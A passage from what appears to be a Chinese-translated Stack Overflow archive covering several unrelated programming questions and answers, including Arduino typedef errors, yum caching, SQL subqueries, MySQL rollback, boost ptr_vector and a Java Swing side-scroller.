#define MIN_PACKET_SIZE     7
#define MIN_ACK_PACKET_SIZE     9
#define MAX_PACKET_SIZE         223
#define MAX_DATA_SIZE       (MAX_PACKET_SIZE-MIN_PACKET_SIZE)

//ID ??
#define MAX_ID                  0xFD    
#define BROADCAST_ID            0xFE  

//CMD - Request Packet
#define CMD_EEP_WRITE           0x01
#define CMD_EEP_READ            0x02
#define CMD_RAM_WRITE           0x03
#define CMD_RAM_READ            0x04    
    #define CMD_RW_DATA_ADDR_IDX    7
    #define CMD_RW_DATA_LEN_IDX     8
#define CMD_I_JOG               0x05
    #define CMD_I_JOG_STRUCT_SIZE   5
    #define CMD_I_JOG_MAX_DRS       (MAX_DATA_SIZE/CMD_I_JOG_STRUCT_SIZE)
#define CMD_S_JOG                   0x06
    #define CMD_S_JOG_STRUCT_SIZE   4
    #define CMD_S_JOG_MAX_DRS       (MAX_DATA_SIZE/CMD_S_JOG_STRUCT_SIZE)
#define CMD_STAT                    0x07    
#define CMD_ROLLBACK                0x08
#define CMD_REBOOT                  0x09

#define CMD_MIN                             (CMD_EEP_WRITE)
#define CMD_MAX                             (CMD_REBOOT)

//CMD - ACK Packet
#define CMD_ACK_MASK                        0x40

#define CMD_EEP_WRITE_ACK                   (CMD_EEP_WRITE|CMD_ACK_MASK)
#define CMD_EEP_READ_ACK                    (CMD_EEP_READ|CMD_ACK_MASK)
#define CMD_RAM_WRITE_ACK                   (CMD_RAM_WRITE|CMD_ACK_MASK)
#define CMD_RAM_READ_ACK                    (CMD_RAM_READ|CMD_ACK_MASK)
#define CMD_I_JOG_ACK                       (CMD_I_JOG|CMD_ACK_MASK)
#define CMD_S_JOG_ACK                       (CMD_S_JOG|CMD_ACK_MASK)
#define CMD_STAT_ACK                        (CMD_STAT|CMD_ACK_MASK)
#define CMD_ROLLBACK_ACK                    (CMD_ROLLBACK|CMD_ACK_MASK)
#define CMD_REBOOT_ACK                      (CMD_REBOOT|CMD_ACK_MASK

#define CMD_ACK_MIN                         (CMD_EEP_WRITE_ACK)
#define CMD_ACK_MAX                         (CMD_REBOOT_ACK)

#define DrsPacket
#define stPacket
#define pstPacket
#define DrsData
 typedef struct DrsSet
  {
    unsigned char   ucStopFlag : 1;
    unsigned char   ucMode : 1;
    unsigned char   ucLedGreen : 1;
    unsigned char   ucLedBlue : 1;
    unsigned char   ucLedRed : 1;
    unsigned char   ucJogInvalid : 1;
    unsigned char   reserved : 2;
  }DrsSet;

    typedef struct DrsJog
    {   
    unsigned int    uiValue : 15;
    unsigned int    reserved : 1;
    }DrsJog;

  typedef struct DrsSJog 
  {
    DrsJog          stJog;
    DrsSet          stSet;
    unsigned char   ucId;
  }DrsSJog;

  typedef struct DrsIJog 
  {
        DrsJog          stJog;
        DrsSet          stSet;
    unsigned char   ucId;
    unsigned char   ucPlayTime;
  }DrsIJog;

  typedef struct DrsIJogData
  {
     DrsIJog            stIJog[CMD_I_JOG_MAX_DRS];
  }DrsIJogData;

  typedef struct DrsSJogData
  {
    unsigned char   ucPlayTime;
     DrsSJog            stSJog[CMD_S_JOG_MAX_DRS];
  }DrsSJogData;

  typedef struct DrsRWData
  {  
    unsigned char   ucAddress;
    unsigned char   ucLen;        
    unsigned char   ucData[MAX_DATA_SIZE-2];
  }DrsRWData;

  typedef union DrsData
  {
    unsigned char   ucData[MAX_PACKET_SIZE-MIN_PACKET_SIZE];

     DrsRWData      stRWData;
     DrsIJogData        stIJogData;
     DrsSJogData        stSJogData;
  }DrsData;

typedef struct DrsPacket 
  {
    unsigned char           ucHeader[2];
    unsigned char           ucPacketSize;
    unsigned char           ucChipID;
    unsigned char           ucCmd;
    unsigned char           ucCheckSum1;
    unsigned char           ucCheckSum2;
    union DrsData               unData;
  }DrsPacket;

//CheckSum
#define CHKSUM_MASK                         0xFE

//////////////////////////////receiving state result value //////////////////////////////
  enum{
    DRS_RXWAITING,
    DRS_RXCOMPLETE,
    DRS_HEADERNOTFOUND,
    DRS_INVALIDSIZE,
    DRS_UNKNOWNCMD,
    DRS_INVALIDID,
    DRS_CHKSUMERROR,
    DRS_RXTIMEOUT
  }DrsRxStatus;

//?? ??? ??? ??
#define USART_BUF_SIZE 256

//?? ??, ?? ???, ?? ???, ??? ?? ??? ?? ??
//USART0_EXT volatile unsigned char gucRxBuffer[USART_BUF_SIZE];
//USART0_EXT volatile unsigned char gucRxBufferReadIdx;
//USART0_EXT volatile unsigned char gucRxBufferWriteIdx;
//USART0_EXT volatile unsigned char gucRxBufferCnt;

volatile unsigned char gucRxBuffer[USART_BUF_SIZE];
volatile unsigned char gucRxBufferReadIdx;
volatile unsigned char gucRxBufferWriteIdx;
volatile unsigned char gucRxBufferCnt;

//USART0? ??? ??
void USART0_Init(unsigned long ulBaudRate);
//USART0? ?? ??? ???? ??
void USART0_PutChar(unsigned char ucData);
//USART0? ?? ?? ?? ???? ??
void USART0_PutNChar(unsigned char *pucData, unsigned char ucCnt);
//USART0? ?? ???? ?? ?? ???? ???? ??
unsigned char USART0_ucGetNChar(unsigned char *pucTarget, unsigned char ucCnt);
//USART0? ?? ???? ?? ?? ???? ??? ??
unsigned char USART0_ucTrashNChar(unsigned char ucCnt);
//USART0? ?? ??? ????? ??
void USART0_ClearBuffer(void);

void hklx_Init(unsigned long ulBaudRate);

void hklx_SendPacket( DrsPacket stPacket);

unsigned char hklx_ucReceivePacket( DrsPacket *pstPacket);

void setup()
{
  //DRS-0101? Calibrated Position ??? ???? ?? ???
typedef struct DrsCaliPos
{
    int     iPosition : 13;
    unsigned int    uiGPIO1 : 1;
    unsigned int    uiGPIO2 : 1;
    unsigned int    reserved : 1;
}

DrsCaliPos;

//Calibrated Position ??? ?? ??? ?? ???
typedef union DrsUnionCaliPos
{
     DrsCaliPos stCaliPos;
    unsigned int    uiCaliPos;
}

DrsUnionCaliPos;

//HerkuleX? ???? ?? ???
    Serial.begin(9600);
    Serial.begin(115200);
    pinMode(rxPin, INPUT); //RX //connect to TX of motor 
    pinMode(txPin, OUTPUT); //TX //connect to RX of motor

}

  typedef struct DrsPacket 
  {
    unsigned char   ucHeader[2];
    unsigned char   ucPacketSize;
    unsigned char   ucChipID;
    unsigned char   ucCmd;
    unsigned char   ucCheckSum1;
    unsigned char   ucCheckSum2;
     DrsData        unData;
  }DrsPacket;

 // void hklx_SendPacket(DrsPacket stPacket){
void hklx_SendPacket(DrsPacket stPacket){
    unsigned char i;
        DrsPacket stPacket;

    // declare header 
    stPacket.ucHeader[0] = HEADER;
    stPacket.ucHeader[1] = HEADER;

    //CheckSum 
    stPacket.ucCheckSum1 = stPacket.ucPacketSize ^ stPacket.ucChipID ^ stPacket.ucCmd;
    for( i=0; i<(stPacket.ucPacketSize-MIN_PACKET_SIZE); i++ )    
        stPacket.ucCheckSum1 ^= stPacket.unData.ucData[i];

    stPacket.ucCheckSum2 = ~(stPacket.ucCheckSum1);
    stPacket.ucCheckSum1 &= CHKSUM_MASK;    
    stPacket.ucCheckSum2 &= CHKSUM_MASK;

    //PacketSize ?? USART0?? ??
    USART0_PutNChar(&stPacket.ucHeader[0], stPacket.ucPacketSize);

    return 0;
} 
```

完整的错误信息：

```
line 136: error: missing type-name in typedef-declaration
line 147: error: missing type-name in typedef-declaration
line 250: error: ISO C++ forbids declaration of 'unData' with no type
line 251: error: missing type-name in typedef-declaration
line 259: error: expected primary-expression before '.' token 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T06:40:17.160

事情是这样的：Arduino IDE 有[自己的预处理器](http://arduino.cc/en/Hacking/BuildProcess)，旨在使初学者更容易。不幸的是，用户定义的类型实际上使我们其他人的事情变得更加困难。

链接页面建议将类型声明放在单独的头文件中。我还通过以下技术取得了成功：

```
typedef struct _xyz {
    int a;
    int b;
    int c;
} XYZ;

void myFunc(struct _xyz *xyzName) {
    ...
} 
```

将生成错误的行更改为`struct _DrsSJogData stSJogData;`应该可以解决错误（假设您也`DrsSJogData`按照我的建议更改了 's 声明），但刚刚阅读了 Arduino 的建议，我会同意这一点。

将所有类型声明放在与主草图分开的头文件中，你应该没问题。

# yum - 相当于 apt-get update 的 yum

> ID：13328283
> 
> 赞同：9
> 
> 时间：2012-11-11T03:19:10.730
> 
> 标签：yum, rhel, apt, package-managers

在 Debian 衍生产品中，在使用 apt 安装软件之前`apt-get install xxx`，需要运行`apt-get update`. 这会刷新包列表，以便正确解析依赖关系等。

在使用 RHEL 实例时，出于习惯，我会`yum update`在安装软件之前运行。但是，这只是为了发现`yum update` *升级*了我的所有包，而不是或者可能除了在本地更新包列表，如`apt-get update`.

运行前是否需要更新 yum 的包列表`yum install xxx`？如果是这样，你怎么做？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-11T03:47:24.960

如果需要，大多数 yum 命令会自动刷新缓存。它的工作方式与 apt 不同，apt 除非运行更新命令，否则不会更新其缓存

# ruby - 如何在 Mongoid 中创建/更新链接文档？

> ID：13328284
> 
> 赞同：1
> 
> 时间：2012-11-11T03:19:35.843
> 
> 标签：ruby, mongodb, mongoid

我有 2 个链接文档，我需要更新其中一个

```
class User
  include Mongoid::Document
  field :name
  has_one :resume
end

class Resume
  include Mongoid::Document
  field :title
  belongs_to :user
end

#...............

new_resume = Resume.new({:title => "my title"})
if current_user.resume && current_user.resume.any? #if resume exists then update it
  current_user.resume.update_attribute(:resume, new_resume)
else #otherwise create it
  current_user.resume.create(:resume, new_resume) 
```

它不起作用，因为在第二种情况下`current_user.resume == nil`。

`update/create` `Resume`当前用户怎么办？

# sql - 每个条目的 SQL 更新查询

> ID：13328287
> 
> 赞同：1
> 
> 时间：2012-11-11T03:20:46.507
> 
> 标签：sql, sql-server

如果在日志中发现某个用户 ID 违规，我不会更新列。

```
UPDATE 
USER_CHECK_LOGIN
SET 
CHECKLOGIN = 2
WHERE 
USER_CHECK_LOGIN.USER_ID = (SELECT NAME from XTREME.gamelogs.dbo.LOG_USING_DEPOT201211 WHERE GATENUM=150); 
```

这个查询的作用是，如果在日志中找到一个用户 ID，其门数为 150，则所有用户都将被禁止。

但我似乎得到了一个错误。

```
Msg 512, Level 16, State 1, Line 2
Subquery returned more than 1 value. This is not permitted when the subquery follows =,     !=, <, <= , >, >= or when the subquery is used as an expression.
The statement has been terminated. 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T03:22:19.063

代替`=`, 使用，`IN()`因为子查询应该返回多行。与子查询返回值`=`进行比较假设只返回一行一列。

```
USER_CHECK_LOGIN.USER_ID IN (SELECT NAME from XTREME.gamelogs.dbo.LOG_USING_DEPOT201211 WHERE GATENUM=150); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-11T04:05:25.243

您可以使用连接完全避免子查询：

```
UPDATE UCL
SET 
CHECKLOGIN = 2
FROM
USER_CHECK_LOGIN UCL
JOIN
XTREME.gamelogs.dbo.LOG_USING_DEPOT201211 LUD
    ON LUD.NAME = UCL.USER_ID
WHERE 
LUD.GATENUM=150; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-11T03:22:48.220

利用`IN`

```
UPDATE 
USER_CHECK_LOGIN
SET 
CHECKLOGIN = 2
WHERE 
USER_CHECK_LOGIN.USER_ID IN (SELECT NAME from XTREME.gamelogs.dbo.LOG_USING_DEPOT201211 WHERE GATENUM=150); 
```

# sharepoint - PPS 报告的 MDX 查询

> ID：13328288
> 
> 赞同：0
> 
> 时间：2012-11-11T03:20:49.273
> 
> 标签：sharepoint, sharepoint-2010

让我先说这是我第一次涉足 PPS 和 MDX，所以我现在很傻。我希望有人可以帮助我，因为我似乎无法用谷歌弄清楚。

我在 PPS 中创建了一个分析图表并部署到 SP 2010。我想将值从 SP 列表过滤器传递到图表。我的 MDX 看起来像：

**SELECT { [Measures].[MyMeasures] } ON COLUMNS, { [MyDim].[MyDimId].[MyDimId].ALLMEMBERS } ON ROWS FROM [MyCube] WHERE ([OtherDim].[OtherDimId].[ `<<Parameter>>`])**

我希望有人可以让我开始使用基于传入的条件逻辑`<<Parameter>>`（双尖括号是 PPS 语法）。

基本上，如果连接到报告的 SP 列表过滤器如下所示：

（空的）

价值1

价值2

这将按原样用于 Value1 和 Value2，但我需要一些方法来检查是否`<<Parameter>>`为（空）。如果是这样，我会将其设置为 ALLMEMBERS，甚至只是删除整个 WHERE 子句。

我希望这是有道理的。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-10T09:41:07.807

您能否将您的 MDX 更改为结尾，`WHERE (<<Parameter>>)`这将意味着创建一个空白参数`WHERE()`并且不会产生任何影响。不过，您需要在参数中传递完整的 OtherDim 成员名称。

# android - Android 上的 Facebook SDK

> ID：13328289
> 
> 赞同：1
> 
> 时间：2012-11-11T03:21:07.463
> 
> 标签：android, facebook, facebook-javascript-sdk

![在此处输入图像描述](../Images/c927135c8d29b33ea9f921b1262d3c46.png)我正在按照此链接中的一个步骤在我的 Android 应用程序中登录 Facebook [http://www.androidhive.info/2012/03/android-facebook-connect-tutorial/](http://www.androidhive.info/2012/03/android-facebook-connect-tutorial/) 但我的问题是当我添加参考没有要添加的项目，我不能在我的 Android Java.class “私人 Facebook facebook;”中使用这一行 因为我无法导入“Facebook”类型

[在此链接https://github.com/facebook/facebook-android-sdk](https://github.com/facebook/facebook-android-sdk)中下载了 Facebook SDK，然后我将其解压缩。文件夹的名称是“facebook-android-sdk-master”，我想以这种方式导入文件。

```
1.Project>import>Existing Project into Workspace> the file
2.Project>import>Archive File> the file
3.Project>import>File System> the file 
```

问题是，当我试图将它添加到我的图书馆时，没有什么可添加的。

所以我在想，也许我在 github 中下载了错误的 Facebook SDK

我下载 Facebook SDK 的方式是

我单击带有悬停文本“将此存储库下载为 zip 文件”的 ZIP 按钮

谁能指出我的错误？因为我在这方面真的很糟糕。

感谢任何想法将不胜感激。

这是我的问题，即使我已经导入了我在 github 中下载的 facebook SDK，我也没有任何项目可以添加到我的参考中

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T03:46:42.573

您下载的包是否在 src 文件夹中包含 Facebook 等类，那么这是您下载的正确 sdk。你要做的是导入这个项目，然后在 android 部分的项目属性中检查是否是一个库选项，它将使其成为一个库项目。现在在项目中你想使用这个你可以通过转到项目属性再次将此项目添加到库中。

如果您仍然无法做到，只需将 facebook sdk 的主 src 文件夹中的类复制并粘贴到您的项目 src 文件夹中，通过将相应的可绘制文件放在您的可绘制目录中，可绘制修复它们的错误很少，然后您将能够在您的项目中使用 Facebook 类。为方便起见，请将其放在单独的包装中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T03:41:13.433

我面临同样的问题。这种方式对我有用：只需转到`File`-> `New Project`-> 选择`Android project from Existing code`，然后按下一步，输入路径 facebook sdk 并按回车，如果 facebook 项目不在下方，请尝试按刷新按钮。它应该如下图所示：

![在此处输入图像描述](../Images/1fefc06c12be3f9c5a02499de56fcf9e.png)

![在此处输入图像描述](../Images/04fa855e2182d3bd74a43fc6f727668d.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-11T03:40:47.363

您需要使用 Eclipse 从现有源创建一个项目 > “facebook-android-sdk/facebook”

这将为 Eclipse 生成 .project 目录和其他必需品。您可以在单独的 Eclipse 实例中执行此步骤，并在完成后关闭它。

现在在您的原始项目中，您应该能够将新创建的项目导入您的工作区，最后从您的项目中添加对它的引用。

# vim - 替代 vim 中的 taglist

> ID：13328290
> 
> 赞同：3
> 
> 时间：2012-11-11T03:21:13.377
> 
> 标签：vim, ctags, taglist

我一直在使用 ctags+taglist 一段时间，试图为自己构建一个 IDE。
Taglist 确实做得很好，但是在与我的 vim 中的缓冲区合作时它偶尔会崩溃。
作为一个新手，我发现我使用插件的方式可能存在一些问题，但我找不到它们。另外，Taglist 的代码太复杂了，我无法理解或修改。
所以我的问题是：是否有 [简单] 替代 Taglist 插件？
也欢迎有关 Taglist 实施的文件。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-11T08:48:55.883

看看[Tagbar](http://majutsushi.github.com/tagbar/)和[winmanager](http://www.vim.org/scripts/script.php?script_id=1440)。Taglist 已准备好与 winmanager 一起使用。

# mysql - 具有回滚事务的 MySQL：是真的吗？

> ID：13328297
> 
> 赞同：2
> 
> 时间：2012-11-11T03:23:22.657
> 
> 标签：mysql, stored-procedures, transactions

如果调用回滚，为什么 MySQL 会插入行然后将其删除？

例如，使用以下代码：

```
declare exit handler for not found rollback;
declare exit handler for sqlwarning rollback;
declare exit handler for sqlexception

BEGIN
select last_insert_id();
rollback;
END;

START TRANSACTION;

INSERT INTO test (text) VALUES ('this_insert_works');
INSERT INTO test (id, text) VALUES (3,'this_insert_fails'); 
```

在存储过程的以下代码中，如果我执行它，然后在没有最后一行的情况下再次执行它（它会起作用），我可以看到“缺少 auto_increment ID”，因为该行被插入然后被删除。返回的选择返回一个不存在的 ID。

**如何避免这种行为？**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T03:25:49.297

你无法避免这种行为。

假设您有两个同时运行的事务，它们都将一些记录插入`test`事务内部。他们的`id`价值观是什么？如果你提交一个但回滚另一个会发生什么？

唯一可行的选择是增加表的 auto_increment 计数器；由于每个事务都看不到彼此的行（但这些行确实存在于它们各自的事务中），这是确保它们都获得唯一 ID 的唯一方法。

虽然这种行为可能看起来不受欢迎，但它实际上是有充分理由的。唯一的其他选择是在执行事务内部时锁定*整个表，防止**所有其他连接*同时将行插入到该表中。这对性能来说是很糟糕的。`INSERT`

# mustache - 如何使用 json 访问嵌套的 json 对象？

> ID：13328298
> 
> 赞同：1
> 
> 时间：2012-11-11T03:23:35.713
> 
> 标签：mustache

如果我插入以下极其简单的 JSON 和模板，这个超级简单的测试会给我带来困难。如何访问“s.name”？

模板：

```
<p>{{s.name}}</p> 
```

JSON：

```
{s:{name:"S"}} 
```

我也试过这个模板 - 仍然无法工作：

```
<p>
{{#s}}
  {{name}}
{{/s}}
</p> 
```

我错过了什么吗？如何访问 JSON 的 s.name？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T22:32:21.240

您的 JSON 无效，因为键不是字符串。使用有效的 JSON，您的任何一个解决方案都可以[像 jsFiddle 上演示的那样](http://jsfiddle.net/maxbeatty/ekJzx/)工作。

`{"s":{"name":"S"}}`

# c++ - 如何从 boost::ptr_vector 中删除“this”

> ID：13328300
> 
> 赞同：1
> 
> 时间：2012-11-11T03:24:07.017
> 
> 标签：c++, boost, ptr-vector

我有一个 boost::ptr_vector 包含指向“可持有”类的指针。

```
boost::ptr_vector<holdable> items; 
```

我从可保存类中向该向量添加新项目，如下所示：

```
currentplanet->items.push_back(this); 
```

其中 currentplanet 是指向包含 ptr_vector 的类的对象的指针。这一切都很好。

我感到困惑的是如何从它自己的类中的函数中删除 ptr_vector 中的条目。我正在努力：

```
currentplanet->items.erase(std::find(currentplanet->items.begin(),
                                     currentplanet->items.end(),
                                     this)); 
```

与此处类似问题的答案一致：[How to erase elements from boost::ptr_vector](https://stackoverflow.com/questions/356002/how-to-erase-elements-from-boostptr-vector)，但我显然在某个地方出错了，可能与“this”的使用有关。

在尝试编译时，我收到来自 stl_algo.h 的错误说

```
stl_algo.h|174|error: no match for 'operator==' in '__first.boost::void_ptr_iterator<VoidIter, T>::operator*
  [with VoidIter = __gnu_cxx::__normal_iterator<void**, std::vector<void*, std::allocator<void*> > >, 
  T = holdable]() == __val'| 
```

我确定这很明显，但我可能对 ptr_vector 的间接性感到困惑......提前感谢您的任何答案！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T07:37:37.943

我知道 std::find 需要第三个参数的值（不是指针），所以你传递了一个 ["begin", "end") 范围来寻找，以及你寻找的值

这是你的意思吗？

```
currentplanet->items.erase(std::find(currentplanet->items.begin(),
                                     currentplanet->items.end(),
                                     *this)); 
```

注意 *this

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-11T10:39:37.667

正如其他人所写 - 确实`ptr_vector`拥有您的对象的所有权，但如果您坚持能够自行删除对象`ptr_vector`- 使用 find_if，而不是 find：

```
Holdable* ptr = this;
currentplanet->items.erase(std::find_if(currentplanet->items.begin(),
                                        currentplanet->items.end(),
                                        [ptr](const Holdable& other) 
                                        {return ptr == &other;} )); 
```

请注意，`find`使用 with`*this`可能会找到其他等于`*this`...

* * *

对于仍然不支持 lambda 表达式的编译器（从 开始`[ptr]`），请使用您自己的谓词：

```
struct CompareToPtr { 
    CompareToPtr(Holdable* ptr) : ptr(ptr) {}
    bool operator () (const Holdable& other) const { return &other == ptr; }
    Holdable* ptr;
};
currentplanet->items.erase(std::find_if(currentplanet->items.begin(),
                                        currentplanet->items.end(),
                                        CompareToPtr(this))); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-11T09:46:10.400

[Alf 是正确](https://stackoverflow.com/a/13329421/12711)的，但出于某种原因`boost::ptr_vector`（和其他相关`boost::reversible_ptr_container`容器）我认为应该被调用。通常，容器元素的迭代器将取消引用对容器的`value_type`.

`boost:ptr_vector<T>::value_type`是一个 typedef `T*`; 但是取消引用 a`boost::ptr_vector<T>::iterator`不会导致`T*`引用。

来自 Boost 文档（[http://www.boost.org/doc/libs/1_52_0/libs/ptr_container/doc/reversible_ptr_container.html](http://www.boost.org/doc/libs/1_52_0/libs/ptr_container/doc/reversible_ptr_container.html)）：

> 还要注意
> 
> ```
> typedef ... iterator 
> ```
> 
> 允许迭代 T& 对象，而不是 T*。

取消引用 a`boost::ptr_vector<T>::iterator`结果为 a `T&`。这就是为什么您对 ptr_vector 的间接性感到困惑的原因，这就是为什么 to 的最后一个参数`std::find()`需要是一个`holdable`对象而不是一个`holdable*`.

最后，请注意 Xeo 关于`ptr_vector`获取指针所有权的评论应该被理解 - 在非常有限的情况下，对象想要删除自己可能是有意义的，但您应该充分理解，在该`erase()`调用之后，您可以不再对对象做任何事情。如果这不是您需要的行为，`erase()`那么您可能不想考虑使用`release()`，这将释放容器对指针的所有权并将其从容器中删除（因此对象不会被破坏）。

# php - 新网站项目 - php vs python vs ruby

> ID：13328304
> 
> 赞同：-1
> 
> 时间：2012-11-11T03:24:55.850
> 
> 标签：php, python, ruby, interactive, new-project

我开始了一个关于网站杂志的项目。到目前为止，我只创建了 css、一些 javascripts 和 html 布局来向我的雇主展示它是关于什么的。

所以我想让它对最终用户更具交互性。注册、用户控制面板、愿望清单、搜索、新页面的自动更新数据库、评论系统、投票系统。

我没有 ruby​​ 或 python 的经验，我可以理解和编辑 php。我应该从什么语言开始编程？从头开始还是使用框架更好？你能推荐一个吗？学习不是问题，但项目必须在今年一月底之前结束。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T03:35:37.153

没有真正的好或坏的答案。这取决于。它还取决于您定位的用户数量（主要是并发用户）。如果他们达到数千，那么您的策略必须更加谨慎。

PHP 有相当多的成熟 CMS 框架可用。其他的也可能存在于 Python 中。如果您选择 Ruby，我认为您会受到更多限制（原因很简单，因为该语言较新）。如果遇到问题，还要考虑最有可能最快找到答案的语言。

在 PHP 方面，最流行的 CMS 是 Wordpress、Drupal 和 Joomla，它们中的大多数都有大量的插件，你可以通过几天的耐心和教程轻松编写新的。还有很多其他的也同样不错，但是坚持使用流行的会增加您快速找到支持或找到您可能需要的插件的可能性。

还有像 Zend 框架这样的框架，还有 Cake PHP 和 Yii，它们可以帮助您更快地从头开始构建应用程序并遵循某种标准。

与 Python 类似，还有 Django Web 框架，它为您提供了一个很好的工具包。

对于 Ruby，基本框架是 Rails，它可以帮助您快速创建数据实体的 Web 应用程序“支架”（即骨架），以便您可以专注于特殊功能，而不是通常的查询/插入/更新/删除内容。

关于可扩展性，都有其优点和缺点。如果你真的需要扩展并且必须与一些企业服务集成，那么 Java 框架（通常由 Tomcat + Spring + JPA/Hibernate + EHCache + ActiveMQ 组成的堆栈）可能是一个更优越的竞争者。但是，如果您之前没有 Java 经验，那么从头开始学习要复杂得多。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-11T03:35:46.920

你从其他程序员那里得到的答案是：“你可以用他们做任何事情”，因为这个想法，一些程序员给了你负面的分数。都是不错的选择。你说你懂 PHP，你可以试试，但也许这是学习另一个的好机会。Ruby、Python 和 PHP 真的很有趣。

# java - 在另一个图像的某个点绘制图像

> ID：13328307
> 
> 赞同：6
> 
> 时间：2012-11-11T03:25:49.120
> 
> 标签：java, image, swing, awt, graphics2d

所以我正在创建一个侧滚动条，我试图在另一个图像的位置绘制一个图像。

我的背景图像是 5000 x 500，假设我想在背景图像的 500、50 处绘制 25x25 的图像。我该怎么做？

到目前为止，我已经尝试过：

```
Coins c = new Coins(img.getWidth(this) - 4500, img.getHeight(this) - 250); 
```

但这只是在帧的 500、50 处绘制它，因此当我向右滚动时它在图像上“移动”。我想在向右滚动一次后，将硬币图像绘制在图像的 500,50 处，仍然是帧的 495、50 处。

我也可以使用背景图像的 getGraphics 并在其上绘制较小的图像，但我认为因为我在创建对象期间设置了要绘制的点，所以我不能这样做。

除了上下，角色不会移动，只是背景滚动，所以我希望硬币像背景一样移动。

图片：（无法嵌入，因为我没有 10 个代表点） [http://dl.dropbox.com/u/47632315/char.png](http://dl.dropbox.com/u/47632315/char.png) http://dl.dropbox.com/u/47632315/coin .png [http://dl.dropbox.com/u/47632315/sideScrollerBG.png](http://dl.dropbox.com/u/47632315/sideScrollerBG.png)

**和 SSCCE：**

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;
import java.net.*;
import java.awt.image.ImageObserver;
import java.io.IOException;
import javax.imageio.ImageIO;

public class SideScroller extends JPanel implements KeyListener {

    public static void main(String args[]) throws Exception {
        SideScroller f = new SideScroller("Side Scroller");
    }

    JFrame f = new JFrame();
    int x = 0;
    int y = 0;
    int k = 10;
    int j = 50;
    int characterY = 351;
    boolean canJump = true;
    boolean keyPressed[] = new boolean[3];

    Image img;
    Image character;

    Coins c = new Coins(x + 500, y + 350);

    public SideScroller(String s) throws MalformedURLException, IOException {
        img = ImageIO.read(new URL("http://dl.dropbox.com/u/47632315/sideScrollerBG.png"));
        character = ImageIO.read(new URL("http://dl.dropbox.com/u/47632315/char.png"));

        f.setTitle(s);
        // don't use 'magic numbers' when descriptive constants are defined!
        //f.setDefaultCloseOperation(3);
        f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        f.setResizable(false);
        // Better to ask when loaded.
        //setPreferredSize(new Dimension(1000, 500));
        setPreferredSize(new Dimension(1000, img.getHeight(this)));
        f.add(this);
        f.pack();
        // usually harmful, rarely necessary.
//      f.setLayout(null);
        // Looks like a splash screen
        //f.setLocationRelativeTo(null);
        // located by platform default, best.
        f.setLocationByPlatform(true);
        f.addKeyListener(this);
        getKeys();

        // should be done last
        f.setVisible(true);
    }

    public void paintComponent(Graphics g) {
        super.paintComponent(g);
        g.drawImage(img, x, y, this);
        g.drawImage(character, 50, characterY, this);
        c.paint(g, this);
    }

    @Override
    public void keyTyped(KeyEvent e) {
    }

    @Override
    public void keyPressed(KeyEvent e) {
        int keyCode = e.getKeyCode();
        if (keyCode == KeyEvent.VK_ESCAPE) {
            System.exit(0);
        }
        if (keyCode == KeyEvent.VK_RIGHT) {
            keyPressed[0] = true;
        }
        if (keyCode == KeyEvent.VK_LEFT) {
            keyPressed[1] = true;
        }
        if (canJump) {
            if (keyCode == KeyEvent.VK_SPACE) {
                // better to use a javax.swing.Timer here
                new Thread(new Runnable() {
                    public void run() {
                        canJump = false;
                        for (double i = 0; i <= 5.1; i += .2) {
                            characterY = (int) (k * i * i - j * i + 351);
                            f.repaint();
                            System.out.println(characterY);
                            System.out.println(canJump);
                            try {
                                Thread.sleep(25);
                            } catch (InterruptedException e) {
                                System.err.println(e);
                            }
                        }
                        repaint();
                        canJump = true;
                    }
                }).start();
            }
        }
    }

    @Override
    public void keyReleased(KeyEvent e) {
        int keyCode = e.getKeyCode();
        if (keyCode == KeyEvent.VK_RIGHT) {
            keyPressed[0] = false;
        }
        if (keyCode == KeyEvent.VK_LEFT) {
            keyPressed[1] = false;
        }
    }

    public void getKeys() {
        new Thread(new Runnable() {
            public void run() {
                while (true) {
                    if (keyPressed[0]) {
                        x -= 5;
                        repaint();
                    }
                    if (keyPressed[1]) {
                        if (x != 0) {
                            x += 5;
                            repaint();
                        }
                    }
                    try {
                        Thread.sleep(25);
                    } catch (InterruptedException e) {
                        System.err.println(e);
                    }
                }
            }
        }).start();
    }
}

class Coins extends pickUpObject {

    Image coin; 

    public Coins(int x, int y) throws MalformedURLException, IOException{
        super(x, y);
        super.x = x;
        super.y = y;
        coin = ImageIO.read(new URL("http://dl.dropbox.com/u/47632315/coin.png"));
    }

    public void paint(Graphics g, ImageObserver o){
        g.drawImage(coin, x, y, o);
    }
}

abstract class pickUpObject {

    int x, y;

    public pickUpObject(int x, int y){
    }

    public abstract void paint(Graphics g, ImageObserver o);
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-11T05:10:33.527

一种方法是将其标记`Graphics`为`Graphics2D`然后翻译它。

```
 // here we 'translate' the graphics 2D object to a separate location  
    g2d.translate(x,0); 
```

## 截图

在此图像中，角色已向右移动并正在跳跃。硬币根据角色向右移动的距离向左移动。

![在此处输入图像描述](../Images/ed3d101f0c504ac3933b21699eeb8c71.png)

## 完整代码

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;
import java.net.*;
import java.awt.image.ImageObserver;
import java.io.IOException;
import javax.imageio.ImageIO;

public class SideScroller extends JPanel implements KeyListener {

    public static void main(String args[]) throws Exception {
        SideScroller f = new SideScroller("Side Scroller");
    }

    JFrame f = new JFrame();
    int x = 0;
    int y = 0;
    int k = 10;
    int j = 50;
    int characterY = 351;
    boolean canJump = true;
    boolean keyPressed[] = new boolean[3];

